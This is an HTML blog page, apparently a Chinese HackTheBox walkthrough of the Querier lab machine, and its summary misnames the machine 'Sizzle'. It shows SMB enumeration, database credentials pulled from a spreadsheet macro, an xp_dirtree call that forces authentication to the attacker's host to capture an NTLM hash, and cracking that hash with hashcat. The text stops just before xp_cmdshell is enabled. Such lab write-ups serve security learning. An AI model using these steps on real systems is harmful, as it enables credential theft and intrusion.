@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html lang='en'>
+
+<head>
+  <meta name="generator" content="Hexo 5.4.0">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
+  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  <title>HTB: Querier - T0x1c</title>
+
+  
+    <meta name="description" content="Sizzle是一个非常困难的靶机，知识点涉及smb匿名访问、SQL server获取凭证、SQL server命令执行、NTLM哈希破解、信息收集等。smb匿名访问共享名后将其中excel下载下来，其中包含SQL server数据库的密码，通过该密码登陆数据库，执行xp_dirtree函数拿到用户访问的NTLM哈希，破解后成功使用该账号密码再次登陆数据库，使用该用户开启xp_cmdshell函数从">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB: Querier">
+<meta property="og:url" content="https://toxic80l.github.io/post/f2d5c746/index.html">
+<meta property="og:site_name" content="T0x1c">
+<meta property="og:description" content="Sizzle是一个非常困难的靶机，知识点涉及smb匿名访问、SQL server获取凭证、SQL server命令执行、NTLM哈希破解、信息收集等。smb匿名访问共享名后将其中excel下载下来，其中包含SQL server数据库的密码，通过该密码登陆数据库，执行xp_dirtree函数拿到用户访问的NTLM哈希，破解后成功使用该账号密码再次登陆数据库，使用该用户开启xp_cmdshell函数从">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://toxic80l.github.io/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8A%E5%8D%889.12.06.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8A%E5%8D%8810.42.05.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8A%E5%8D%8810.42.19.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8A%E5%8D%8810.46.45.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8A%E5%8D%8811.37.59.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8B%E5%8D%882.54.02.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8B%E5%8D%883.06.04.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8B%E5%8D%883.07.15.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8B%E5%8D%883.08.09.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8B%E5%8D%883.17.20.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8B%E5%8D%883.22.09.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8B%E5%8D%883.22.34.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8B%E5%8D%883.27.59.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8B%E5%8D%883.39.06.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8B%E5%8D%883.39.52.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8B%E5%8D%883.44.05.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8B%E5%8D%883.49.07.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8B%E5%8D%883.50.39.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8B%E5%8D%884.27.50.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8B%E5%8D%884.34.11.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8B%E5%8D%884.48.37.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8B%E5%8D%884.49.18.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8B%E5%8D%884.57.40.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8B%E5%8D%885.01.08.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-04%20%E4%B8%8B%E5%8D%883.48.28.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-04%20%E4%B8%8B%E5%8D%883.54.10.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-04%20%E4%B8%8B%E5%8D%883.56.08.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-04%20%E4%B8%8B%E5%8D%883.56.50.png">
+<meta property="article:published_time" content="2022-02-28T01:09:23.000Z">
+<meta property="article:modified_time" content="2022-02-28T03:34:07.221Z">
+<meta property="article:author" content="toxic80L">
+<meta property="article:tag" content="靶机">
+<meta property="article:tag" content="smb">
+<meta property="article:tag" content="Windows">
+<meta property="article:tag" content="SQL Server">
+<meta property="article:tag" content="excel">
+<meta property="article:tag" content="组策略">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://toxic80l.github.io/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8A%E5%8D%889.12.06.png">
+  
+  
+
+  <!-- feed -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+
+  
+</head>
+
+<body>
+  
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='post'>
+    
+
+
+<header class="header">
+
+<div class="logo-wrap"><a class="avatar" href="/medias/avatar.png"><div class="bg" style="opacity:0;background-image:url(https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.2/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.png" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></a><a class="title" href="/"><div class="main">T0x1c</div><div class="sub cap">我在听你的独家记忆</div></a></div>
+<nav class="menu dis-select"><a class="nav-item active" href="/">Blog</a><a class="nav-item" href="/wiki/">Wiki</a><a class="nav-item" href="/notes/">notes</a><a class="nav-item" href="/friends/">more</a></nav></header>
+
+<div class="widgets">
+
+<div class="widget-wrap single" id="toc"><div class="widget-header cap dis-select"><span class="name">TOC</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E4%BE%A6%E6%9F%A5"><span class="toc-text">0x01 侦查</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="toc-text">端口探测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#445%E7%AB%AF%E5%8F%A3"><span class="toc-text">445端口</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E4%B8%8A%E7%BA%BF-mssql-svc"><span class="toc-text">0x02 上线[mssql-svc]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-Server%E7%99%BB%E9%99%86"><span class="toc-text">SQL Server登陆</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#smb%E8%8E%B7%E5%8F%96ntlm%E5%93%88%E5%B8%8C"><span class="toc-text">smb获取ntlm哈希</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ntlm%E5%93%88%E5%B8%8C%E7%A0%B4%E8%A7%A3"><span class="toc-text">ntlm哈希破解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xp-cmdshell%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">xp_cmdshell命令执行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-administrator"><span class="toc-text">0x03 权限提升[administrator]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E7%BA%BF%E7%AE%A1%E7%90%86%E5%91%98"><span class="toc-text">上线管理员</span></a></li></ol></li></ol></div></div></div>
+
+
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/toxic80L" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.3/social/08a41b181ce68.svg"/></a></div></footer>
+
+    </aside>
+    <div class='l_main'>
+      
+
+      
+
+
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">Home</a><span class="sep"></span><a class="cap breadcrumb" href="/">Blog</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/HackTheBox/">HackTheBox</a></div><div id="post-meta">Posted on&nbsp;<time datetime="2022-02-28T01:09:23.000Z">2022-02-28</time></div></div>
+
+<article class='content md post'>
+<h1 class="article-title"><span>HTB: Querier</span></h1>
+<p>Sizzle是一个非常困难的靶机，知识点涉及smb匿名访问、SQL server获取凭证、SQL server命令执行、NTLM哈希破解、信息收集等。smb匿名访问共享名后将其中excel下载下来，其中包含SQL server数据库的密码，通过该密码登陆数据库，执行xp_dirtree函数拿到用户访问的NTLM哈希，破解后成功使用该账号密码再次登陆数据库，使用该用户开启xp_cmdshell函数从而完成命令执行成功拿到用户权限，在靶机中找到组策略文件当中的管理员密码，破解后成功获取管理员权限。感兴趣的同学可以在HackTheBox中进行学习。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8A%E5%8D%889.12.06.png" alt="截屏2021-12-03 上午9.12.06"></p>
+<h2 id="0x01-侦查"><a href="#0x01-侦查" class="headerlink" title="0x01 侦查"></a>0x01 侦查</h2><h3 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h3><p>首先通过nmap对目标进行端口扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -p- -sV -sC -A 10.10.10.125 -oA nmap_Querier</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8A%E5%8D%8810.42.05.png" alt="截屏2021-12-03 上午10.42.05"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8A%E5%8D%8810.42.19.png" alt="截屏2021-12-03 上午10.42.19"><br>扫描结果显示目标开放了135、445、1433、5985等端口</p>
+<h4 id="445端口"><a href="#445端口" class="headerlink" title="445端口"></a>445端口</h4><p>使用 smbmap 对 smb 服务进行初步扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 10.10.10.125</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8A%E5%8D%8810.46.45.png" alt="截屏2021-12-03 上午10.46.45"><br>使用 smbclient 查看共享名称，在其中发现<code>Reports</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -N -L 10.10.10.125</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8A%E5%8D%8811.37.59.png" alt="截屏2021-12-03 上午11.37.59"><br>使用 smbclient 连接共享名<code>Reports</code>，发现其中存在一个 excel 文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -N //10.10.10.125/Reports</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8B%E5%8D%882.54.02.png" alt="截屏2021-12-03 下午2.54.02"><br>下载该文件并移到本地环境使用 excel 软件打开，但是文件为空</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smb &gt; get <span class="string">&quot;Currency Volume Report.xlsm&quot;</span></span><br></pre></td></tr></table></figure>
+<p>使用 strings 查看该文件也没什么发现</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings Currency\ Volume\ Report.xlsm</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8B%E5%8D%883.06.04.png" alt="截屏2021-12-03 下午3.06.04"><br>继续使用 binwalk 将该文件中的各种源文件提取出来</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e Currency\ Volume\ Report.xlsm</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8B%E5%8D%883.07.15.png" alt="截屏2021-12-03 下午3.07.15"><br>通过查找后在<code>vbaProject.bin</code>中发现端倪</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings vbaProject.bin</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8B%E5%8D%883.08.09.png" alt="截屏2021-12-03 下午3.08.09"><br>其中存在 SQLServer 的账号密码以及连接信息</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6</span></span><br></pre></td></tr></table></figure>
+<h2 id="0x02-上线-mssql-svc"><a href="#0x02-上线-mssql-svc" class="headerlink" title="0x02 上线[mssql-svc]"></a>0x02 上线[mssql-svc]</h2><h3 id="SQL-Server登陆"><a href="#SQL-Server登陆" class="headerlink" title="SQL Server登陆"></a>SQL Server登陆</h3><p>既然有了数据库连接信息，那么可使用 mssqlclient.py 连接目标的 MSSQL 数据库</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 mssqlclient.py reporting:<span class="string">&#x27;PcwTWTHRwryjc$c6&#x27;</span>@10.10.10.125 -windows-auth</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8B%E5%8D%883.17.20.png" alt="截屏2021-12-03 下午3.17.20"><br>登陆成功后对数据库进行信息收集，包括库名和权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SQL &gt; select * from fn_my_permissions(NULL, <span class="string">&#x27;SERVEr&#x27;</span>); //查看当前用户权限</span><br><span class="line">SQL &gt; select name from master.sys.databases; //查看可用数据库</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8B%E5%8D%883.22.09.png" alt="截屏2021-12-03 下午3.22.09"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8B%E5%8D%883.22.34.png" alt="截屏2021-12-03 下午3.22.34"><br>查询数据库中的表名</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQL &gt; select * from sysobjects <span class="built_in">where</span> xtype=<span class="string">&#x27;U&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8B%E5%8D%883.27.59.png" alt="截屏2021-12-03 下午3.27.59"><br>经过查询后发现目标数据库并没有什么可利用的数据。</p>
+<h3 id="smb获取ntlm哈希"><a href="#smb获取ntlm哈希" class="headerlink" title="smb获取ntlm哈希"></a>smb获取ntlm哈希</h3><p>而在之前做 Giddy 靶机的时候遇到过<code>xp_dirtree</code>命令，尝试使用它来利用 smb 进行身份验证，在本地开启监听从而获取 ntlm 哈希值。首先在本地开启 responder</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -I tun0</span><br></pre></td></tr></table></figure>
+<p>通过 SQL 语句以服务用户的身份连接本地的 smb 共享</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQL &gt; xp_dirtree <span class="string">&#x27;\\10.10.14.5\a&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8B%E5%8D%883.39.06.png" alt="截屏2021-12-03 下午3.39.06"><br>在 responder 中成功获取到 ntlm 哈希值<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8B%E5%8D%883.39.52.png" alt="截屏2021-12-03 下午3.39.52"></p>
+<h3 id="ntlm哈希破解"><a href="#ntlm哈希破解" class="headerlink" title="ntlm哈希破解"></a>ntlm哈希破解</h3><p>使用 hashcat 破解 ntlm 哈希值</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 5600 querier.ntlmv2.hash /usr/share/wordlists/rockyou.txt -o querier.ntlmv2.cracked --force</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8B%E5%8D%883.44.05.png" alt="截屏2021-12-03 下午3.44.05"><br>成功拿到密码为<code>corporate568</code>，那么我们就可以使用新的身份再次登录数据库</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 mssqlclient.py mssql-svc:<span class="string">&#x27;corporate568&#x27;</span>@10.10.10.125 -windows-auth</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8B%E5%8D%883.49.07.png" alt="截屏2021-12-03 下午3.49.07"><br>查询用户 mssql-svc 的所有权限，发现该用户相比之前的用户拥有更多有用的权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQL &gt; select * from fn_my_permissions(NULL, <span class="string">&#x27;SERVEr&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f2d5c746/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8B%E5%8D%883.50.39.png" alt="截屏2021-12-03 下午3.50.39"></p>
+<h3 id="xp-cmdshell命令执行"><a href="#xp-cmdshell命令执行" class="headerlink" title="xp_cmdshell命令执行"></a>xp_cmdshell命令执行</h3><p>这也就意味着我可以尝试通过 xp_cmdshell 来运行系统命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQL &gt; xp_cmdshell whoami</span><br></pre></td></tr></table></figure>
+<p>但是命令无法执行，这不是因为我没有使用完整的 SQL 语句：<code>exec xp_cmdshell [command]</code>，它报错的主要原因是 xp_cmdshell 未开启。而一般情况下我们可以执行如下命令来开启 xp_cmdshell</p>
